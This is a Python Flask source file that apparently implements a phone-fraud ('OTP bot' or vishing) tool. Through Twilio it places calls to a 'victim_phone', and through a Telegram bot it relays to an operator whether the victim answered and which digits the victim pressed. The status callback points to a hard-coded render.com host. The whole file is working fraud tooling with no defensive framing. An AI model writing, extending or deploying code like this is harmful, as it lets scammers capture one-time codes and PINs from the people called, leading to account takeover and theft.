import os
import requests
from flask import Flask, request
from twilio.rest import Client

app = Flask(__name__)

# Use environment variables to store sensitive information
TWILIO_ACCOUNT_SID = os.getenv("TWILIO_ACCOUNT_SID")  # Get from environment variable
TWILIO_AUTH_TOKEN = os.getenv("TWILIO_AUTH_TOKEN")    # Get from environment variable
TWILIO_PHONE_NUMBER = os.getenv("TWILIO_PHONE_NUMBER")  # Get from environment variable

# Telegram Bot Token
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")  # Get from environment variable

@app.route('/twilio_webhook', methods=['POST'])
def twilio_webhook():
    """Handle incoming webhook from Twilio when the victim presses a key or answers the phone."""
    # Log the incoming request body
    data = request.form
    print(f"Received data: {data}")
    
    # Extract telegram_user_id from the URL query parameters
    telegram_user_id = request.args.get('telegram_user_id', None)
    print(f"Telegram User ID: {telegram_user_id}")
    
    # Check call status or digit pressed by the victim
    call_status = data.get('CallStatus', '')
    digit = data.get('Digits', None)
    
    if call_status == 'completed':
        print("The call was answered by a human.")
        send_telegram_message(telegram_user_id, "The victim picked up the phone!")
    
    elif call_status == 'busy' or call_status == 'failed':
        print("The call went to voicemail.")
        send_telegram_message(telegram_user_id, "The victim's voicemail answered the call.")
    
    if digit:
        print(f"Digit Pressed: {digit}")
        send_telegram_message(telegram_user_id, f"The victim pressed: {digit}")
    else:
        print("No digit pressed.")
    
    return 'OK', 200  # Return acknowledgment

def send_telegram_message(user_id, message):
    """Send a message to the Telegram user."""
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    params = {'chat_id': user_id, 'text': message}
    response = requests.get(url, params=params)
    print(f"Sent message to Telegram user {user_id}: {message}, Response: {response.status_code}")
    print(response.status_code)
    print(response.text)

@app.route('/make_call', methods=['POST'])
def make_call():
    """Initiates a call via Twilio."""
    victim_phone = request.form.get('victim_phone')
    telegram_user_id = request.form.get('telegram_user_id')

    if victim_phone:
        try:
            # Create the Twilio client
            client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)

            # Initiate the call
            call = client.calls.create(
                to=victim_phone,
                from_=TWILIO_PHONE_NUMBER,
                url='http://twimlbin.com/your_twiml_url',  # URL where Twilio gets instructions for the call (TwiML)
                method='POST',
                status_callback=f"https://glitcherz.onrender.com/twilio_webhook?telegram_user_id={telegram_user_id}"  # Status callback for updates
            )

            print(f"Call initiated with SID: {call.sid}")
            return f"Call initiated! SID: {call.sid}"
        except Exception as e:
            print(f"Error occurred: {e}")
            return "Error occurred while initiating the call.", 500
    else:
        return "Victim phone number is required.", 400


# Main function to run the app
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
